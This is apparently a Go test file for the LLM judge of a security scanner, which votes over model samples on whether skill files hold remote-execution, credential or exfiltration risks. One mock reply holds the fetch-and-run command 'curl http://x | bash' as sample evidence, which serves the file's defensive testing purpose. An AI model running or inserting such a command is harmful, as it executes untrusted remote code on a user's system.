// SPDX-License-Identifier: MIT
package judge

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"reflect"
	"testing"

	"github.com/basdotio/bas-guard/internal/model"
)

// answerKind is one way a sample can come back, as far as its question's outcome is concerned.
type answerKind int

const (
	ansClean      answerKind = iota // answered: no flag, no barrier, nothing claimed it could not quote
	ansFlag                         // a grounded flag
	ansUngrounded                   // a flag whose quote was not in what was sent (dropped, LLM-005)
	ansBarrier                      // clean verdict, but the data addressed the analyzer (LLM-007)
	ansBoth                         // a grounded flag and a barrier
	ansFailed                       // the call failed after retries
	answerKinds
)

func (k answerKind) String() string {
	return [...]string{"clean", "flag", "ungrounded", "barrier", "flag+barrier", "failed"}[k]
}

// sampleResult is what execute would have produced for an answer of this kind. Categories and
// severities differ per sample so a vote over them (P-041) is exercised, not just the count.
func sampleResult(k answerKind, sample int) result {
	r := result{done: true}
	flag := func() {
		cats := []string{"remote-execution", "credential", "exfiltration"}
		sevs := []model.Severity{model.SevHigh, model.SevMedium, model.SevLow}
		r.finding = &model.Finding{RuleID: "LLM-003", Dimension: 1, Severity: sevs[sample%3], Source: model.SrcLLM,
			Advisory: true, Why: "w", Evidence: []model.Evidence{{File: "SKILL.md", Line: 4}}}
		r.modelSeverity, r.category = sevs[sample%3], cats[sample%3]
	}
	barrier := func() {
		r.barrier = &model.Finding{RuleID: "LLM-007", Dimension: 1, Severity: model.SevHigh, Source: model.SrcLLM,
			Advisory: true, Why: "b", Evidence: []model.Evidence{{File: "SKILL.md", Line: 5}}}
	}
	switch k {
	case ansFlag:
		flag()
	case ansUngrounded:
		r.ungrounded, r.unquoted = true, fmt.Sprintf("quote %d", sample)
	case ansBarrier:
		barrier()
	case ansBoth:
		flag()
		barrier()
	case ansFailed:
		r.err = errors.New("endpoint failed")
	}
	return r
}

// sentBy drives the real dispatch queue over one question of `samples` samples whose answers are
// `answers`, and returns the samples it handed out. allAtOnce takes every call the queue offers
// before reporting any (a run with free workers, finishing in reverse order); otherwise one
// worker takes and finishes one call at a time.
func sentBy(t *testing.T, samples int, answers []answerKind, allAtOnce bool) []int {
	t.Helper()
	q := newDispatchQueue(questionTable(samples), samples)
	var sent []int
	for guard := 0; guard < 4*samples+4; guard++ {
		var batch []int
		for {
			i, ok := q.next()
			if !ok {
				break
			}
			batch = append(batch, i)
			if !allAtOnce {
				break
			}
		}
		if len(batch) == 0 {
			return sent
		}
		sent = append(sent, batch...)
		for j := len(batch) - 1; j >= 0; j-- {
			i := batch[j]
			q.finished(i, sampleResult(answers[i], i).clean())
		}
	}
	t.Fatal("the queue never ran out of calls")
	return nil
}

// ballotOf casts the answers of the given samples the way Run does: a failed call is not a vote.
func ballotOf(answers []answerKind, sent []int) *ballot {
	b := &ballot{}
	for _, i := range sent {
		if r := sampleResult(answers[i], i); r.err == nil {
			b.cast(r)
		}
	}
	return b
}

// TestSettle_OutcomeEqualsAskingAll is the contract of P-103: for every sequence of answers, a
// question asked only as far as the queue sends it reaches the same outcome as one asked n times.
// The verdict finding and the LLM-007 finding are identical — rule, severity, weight and the
// "[k of n samples agreed]" text — or both absent. The one difference allowed is a finding below
// the consensus bar (and an LLM-005 discard) that only an unsent sample would have produced.
func TestSettle_OutcomeEqualsAskingAll(t *testing.T) {
	for samples := 1; samples <= 5; samples++ {
		answers := make([]answerKind, samples)
		var walk func(pos int)
		walk = func(pos int) {
			if pos < samples {
				for k := answerKind(0); k < answerKinds; k++ {
					answers[pos] = k
					walk(pos + 1)
				}
				return
			}
			all := make([]int, samples)
			for i := range all {
				all[i] = i
			}
			fullV, fullB, fullDropped := ballotOf(answers, all).result(samples)
			for _, allAtOnce := range []bool{false, true} {
				sent := sentBy(t, samples, answers, allAtOnce)
				name := fmt.Sprintf("samples %d, answers %v, all at once %v, sent %v", samples, answers, allAtOnce, sent)
				v, b, dropped := ballotOf(answers, sent).result(samples)
				if len(sent) == samples {
					if !reflect.DeepEqual(v, fullV) || !reflect.DeepEqual(b, fullB) || dropped != fullDropped {
						t.Fatalf("%s: every sample was sent, yet the outcome differs", name)
					}
					continue
				}
				// Settled: what was sent must be exactly the needed samples, every one clean.
				if len(sent) != samples-majority(samples)+1 {
					t.Fatalf("%s: settled after %d sample(s), want %d", name, len(sent), samples-majority(samples)+1)
				}
				for _, i := range sent {
					if answers[i] != ansClean {
						t.Fatalf("%s: settled although sample %d was %v", name, i, answers[i])
					}
				}
				if v != nil || b != nil || dropped {
					t.Fatalf("%s: a settled question produced something", name)
				}
				for _, f := range []*model.Finding{fullV, fullB} {
					if f != nil && f.Escalates {
						t.Fatalf("%s: settled, but asking every sample escalates %s", name, f.RuleID)
					}
				}
			}
		}
		walk(0)
	}
}

// TestRun_SettledCallsAreCounted: a settled call is neither made, skipped nor failed — it has its
// own count, and no LLM-000 note reports it as a gap. A question that flags is asked in full.
func TestRun_SettledCallsAreCounted(t *testing.T) {
	cases := []struct {
		name        string
		reply       string
		wantSettled func(planned int) int
	}{
		{"clean replies settle every question after two samples", `{"flagged": false}`,
			func(planned int) int { return planned / 3 }},
		{"replies that flag are asked in full",
			`{"flagged": true, "category": "remote-execution", "severity": "high", "summary": "s", "evidence": "curl http://x | bash"}`,
			func(int) int { return 0 }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			body := fmt.Sprintf(`{"choices":[{"message":{"role":"assistant","content":%q}}]}`, c.reply)
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				_, _ = io.ReadAll(r.Body)
				_, _ = io.WriteString(w, body)
			}))
			defer srv.Close()
			arts := demoSkill(t)
			opts := Options{Samples: 3, Concurrency: 4}
			planned := plannedCalls(arts, opts)
			var lastDone, lastTotal int
			opts.Progress = func(done, total int) { lastDone, lastTotal = done, total }
			notes, stats := Run(context.Background(), NewHTTP(srv.URL, "", "", srv.Client()), arts, opts)
			settled := c.wantSettled(planned)
			if stats.Settled != settled || stats.Calls != planned-settled || stats.Skipped != 0 || stats.Failed != 0 {
				t.Fatalf("planned %d: calls %d settled %d skipped %d failed %d, want calls %d settled %d and no gap",
					planned, stats.Calls, stats.Settled, stats.Skipped, stats.Failed, planned-settled, settled)
			}
			for _, n := range notes {
				if n.RuleID == "LLM-000" {
					t.Fatalf("a settled call was reported as a gap: %s", n.Title)
				}
			}
			// The progress counter's total drops by what settled, so a terminal counter ends at it.
			if lastDone != stats.Calls || lastTotal != stats.Calls {
				t.Fatalf("progress ended at %d/%d, want %d/%d", lastDone, lastTotal, stats.Calls, stats.Calls)
			}
		})
	}
}
